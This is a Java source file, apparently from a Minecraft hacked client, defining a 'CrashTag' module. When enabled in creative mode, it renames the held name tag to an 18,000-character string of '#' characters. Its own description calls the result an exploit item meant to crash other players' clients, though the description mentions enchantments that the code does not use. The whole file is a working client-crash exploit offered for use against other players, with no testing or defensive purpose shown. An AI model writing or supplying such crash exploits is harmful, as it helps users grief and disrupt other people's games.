package client.module.impl.items;

import client.module.Category;
import client.module.Module;
import client.utils.misc.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;
import net.minecraft.item.ItemStack;

public class CrashTag extends Module {

    private final Minecraft mc = Minecraft.getMinecraft();

    public CrashTag() {
        super("CrashTag", Category.ITEMS);
        setDescription("Creates an exploit item with extreme enchantments to crash clients");
    }

    @Override
    public void onEnable() {
        super.onEnable();
        if (mc.player == null || mc.world == null) {
            toggle();
            return;
        }
        if (!mc.player.capabilities.isCreativeMode) {
            ChatUtils.error("Creative mode only.");
            toggle();
            return;
        }
        ItemStack held = mc.player.inventory.getCurrentItem();
        if (held == null || held.func_190926_b() || !(held.getItem() instanceof ItemNameTag)) {
            ChatUtils.error("You need a nametag in your hand.");
            toggle();
            return;
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 18000; i++) {
            sb.append('#');
        }
        held.setStackDisplayName(sb.toString());
        mc.displayGuiScreen(new GuiInventory(mc.player));
        mc.player.closeScreen();
        ChatUtils.message("Nametag modified.");
        toggle();
    }
}
